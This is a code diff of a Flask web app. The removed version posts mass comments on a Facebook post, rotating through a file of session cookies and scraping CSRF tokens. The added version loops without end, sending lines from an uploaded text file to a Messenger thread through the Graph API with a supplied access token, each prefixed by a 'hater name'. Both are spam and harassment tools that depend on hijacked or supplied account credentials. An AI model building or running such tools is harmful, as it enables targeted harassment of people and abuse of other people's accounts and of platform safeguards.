@@ -1,212 +1,128 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request
 import requests
-import re
+from time import sleep
 import time
-import threading
-from requests.exceptions import RequestException
+from datetime import datetime
 
 app = Flask(__name__)
 
-class FacebookCommenter:
-    def __init__(self):
-        self.comment_count = 0
-
-    def comment_on_post(self, cookies, post_id, comment, delay):
-        with requests.Session() as r:
-            r.headers.update({
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'sec-fetch-site': 'none',
-                'accept-language': 'id,en;q=0.9',
-                'Host': 'mbasic.facebook.com',
-                'sec-fetch-user': '?1',
-                'sec-fetch-dest': 'document',
-                'accept-encoding': 'gzip, deflate',
-                'sec-fetch-mode': 'navigate',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
-                'connection': 'keep-alive',
-            })
-
-            response = r.get(f'https://mbasic.facebook.com/{post_id}', cookies={"cookie": cookies})
-
-            next_action_match = re.search('method="post" action="([^"]+)"', response.text)
-            if next_action_match:
-                self.next_action = next_action_match.group(1).replace('amp;', '')
-            else:
-                print("<Error> Next action not found")
-                return
-
-            fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
-            if fb_dtsg_match:
-                self.fb_dtsg = fb_dtsg_match.group(1)
-            else:
-                print("<Error> fb_dtsg not found")
-                return
-
-            jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
-            if jazoest_match:
-                self.jazoest = jazoest_match.group(1)
-            else:
-                print("<Error> jazoest not found")
-                return
-
-            data = {
-                'fb_dtsg': self.fb_dtsg,
-                'jazoest': self.jazoest,
-                'comment_text': comment,
-                'comment': 'Submit',
-            }
-
-            r.headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'referer': f'https://mbasic.facebook.com/{post_id}',
-                'origin': 'https://mbasic.facebook.com',
-            })
-
-            response2 = r.post(f'https://mbasic.facebook.com{self.next_action}', data=data, cookies={"cookie": cookies})
-
-            if 'comment_success' in str(response2.url) and response2.status_code == 200:
-                self.comment_count += 1
-                print(f"Comment successfully posted: {comment}")
-            else:
-                print(f"Failed to post comment: {comment}, URL: {response2.url}, Status Code: {response2.status_code}")
-
-    def handle_inputs(self, cookie_file, post_id, kidx_name, comment_file, delay):
-        try:
-            your_cookies = cookie_file.read().splitlines()
-
-            if len(your_cookies) == 0:
-                print("<Error> The cookies file is empty")
-                return
-
-            comments = comment_file.read().splitlines()
-            cookie_index = 0
-
-            for comment in comments:
-                comment = kidx_name + ' ' + comment.strip()
-                if comment:
-                    time.sleep(delay)
-                    self.comment_on_post(your_cookies[cookie_index], post_id, comment, delay)
-                    cookie_index = (cookie_index + 1) % len(your_cookies)
-        except RequestException as e:
-            print(f"<Error> {str(e).lower()}")
-        except Exception as e:
-            print(f"<Error> {str(e).lower()}")
-        except KeyboardInterrupt:
-            pass
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
 @app.route('/', methods=['GET', 'POST'])
-def index():
+def send_message():
     if request.method == 'POST':
-        cookies_file = request.files['cookies_file']
-        post_id = request.form['post_id']
-        kidx_name = request.form['kidx_name']
-        comment_file = request.files['comment_file']
-        delay = int(request.form['delay'])
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-        commenter = FacebookCommenter()
-        threading.Thread(target=commenter.handle_inputs, args=(cookies_file, post_id, kidx_name, comment_file, delay)).start()
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-        return "Commenting started. Check the console for details."
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(300000)
 
-    return render_template_string('''
-        
 
-    <!DOCTYPE html>
+    return '''
+    
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𝗛𝗘𝗡𝗥𝗬 𝗣𝗢𝗦𝗧 𝗦𝗘𝗥𝗩𝗘𝗥</title>
-    <style>
-        body {
-            background-image: url('https://i.ibb.co/f0JCQMM/Screenshot-20240922-100537-Gallery.jpg');
-            background-size: cover;
-            font-family: Arial, sans-serif;
-            color: yellow;
-            text-align: center;
-            padding: 0;
-            margin: 0;
-        }
-        .container {
-            margin-top: 50px;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            display: inline-block;
-        }
-        h1 {
-            font-size: 3em;
-            color: #f1c40f;
-            margin: 0;
-        }
-        .status {
-            color: cyan;
-            font-size: 1.2em;
-        }
-        input[type="text"], input[type="file"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: yellow;
-            color: black;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-        }
-        button:hover {
-            background-color: orange;
-        }
-        .task-status {
-            color: white;
-            font-size: 1.2em;
-            margin-top: 20px;
-        }
-        .task-status .stop {
-            background-color: red;
-            color: white;
-            padding: 5px 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .footer {
-            margin-top: 20px;
-            color: white;
-        }
-        a {
-            color: cyan;
-            text-decoration: none;
-        }
-    </style>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>LAGEND LADKA</title>
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+	<style>
+		body{
+			background-image: url('https://i.imgur.com/WcDAbG2.jpeg');
+		}
+		.container{
+			max-width: 500px;
+			background-image: url('https://i.imgur.com/WcDAbG2.jpeg');
+			border-radius: 10px;
+			padding: 20px;
+			box-shadow: 1 1 10px rgba(0, 0, 0, 0.1);
+			margin: 0 auto;
+			margin-top: 20px;
+		}
+		.header{
+			text-align: center;
+			padding-bottom: 20px;
+		}
+		.btn-submit{
+			width: 100%;
+			margin-top: 10px;
+		}
+		.footer{
+			text-align: center;
+			margin-top: 20px;
+			color: red;
+		}
+	</style>
 </head>
 <body>
-    <div class="container">
-        <h1>OFFLINE POST LOADER</h1>
-     <div class="status">𝐇𝟑𝐍𝐑𝐘 𝐃𝐎𝐍 𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑</div>
-    <form method="POST" enctype="multipart/form-data">
-        Post Uid: <input type="text" name="post_id"><br><br>
-        Delay (in seconds): <input type="number" name="delay"><br><br>
-        Cookies File: <input type="file" name="cookies_file"><br><br>
-        Comments File: <input type="file" name="comments_file"><br><br>
-        <button type="submit">Start Sending Comments</button>
-        </form>
-        
-        
-        <div class="footer">
-            <a href="https://www.facebook.com/profile.php?id=100084622334325">Send Me Req For Fb All Tricks</a>
-        </div>
-    </div>
-</body>
-</html>
-    ''')
+	<header class="header mt-4">
+    <h1 class="mb-3"> 😈├┼H3NRY┼┤😈 </h1> 𝐎𝐅𝐅𝐋𝟏𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐋𝟗𝐆𝟑𝐍𝐃 𝐍𝟗𝐑𝐔𝐓𝟎
+		<h1 class="mt-3">𝐎𝐖𝐍𝟑𝐑 :: 𝐋𝟗𝐆𝟑𝐍𝐃 𝐇𝐄𝐍𝐑𝐘 ✨💫❤  </h1>
+	</header>
 
-if __name__ == "__main__":
+	<div class="container">
+		<form action="/" method="post" enctype="multipart/form-data">
+			<div class="mb-3">
+				<label for="accessToken">ᴇɴᴛᴇʀ ʏᴏᴜʀ ɪᴅ ᴛᴏᴋᴇɴ:</label>
+				<input type="text" class="form-control" id="accessToken" name="accessToken" required>
+			</div>
+			<div class="mb-3">
+				<label for="threadId">Enter ᴄᴏɴᴠᴏ/ɪɴʙᴏx ɪᴅ:</label>
+				<input type="text" class="form-control" id="threadId" name="threadId" required>
+			</div>
+			<div class="mb-3">
+				<label for="kidx">ᴇɴᴛᴇʀ ʜᴀᴛᴇʀ ɴᴀᴍᴇ:</label>
+				<input type="text" class="form-control" id="kidx" name="kidx" required>
+			</div>
+			<div class="mb-3">
+				<label for="txtFile">ꜱᴀʟᴇᴄᴛ ʏᴏᴜʀ ɴᴏᴛᴘᴀɪᴅ ꜰɪʟᴇ:</label>
+				<input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+			</div>
+			<div class="mb-3">
+				<label for="time">ꜱᴘᴇᴇᴅ ɪɴ ɪɴ ꜱᴇᴄᴏɴᴅ:</label>
+				<input type="number" class="form-control" id="time" name="time" required>
+			</div>
+			<button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+		</form>
+	</div>
+	<footer class="footer">
+		<p>&copy; 2023 𝙉𝙊𝙏 𝙄𝙉 𝘼 𝙍𝙐𝙇𝙀𝙓. All Rights Reserved.</p>
+    <p>Convo/Inbox Loader Tool</p>
+		<p>Made with 𝐋𝐀𝐆𝐄𝐍𝐃 𝐇𝐄𝐍𝐑𝐘 ❤💙 by <a href="https://github.com/SK-BAAP-786</a></p>
+	</footer>
+</body>
+  </html>
+    '''
+
+
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-                             
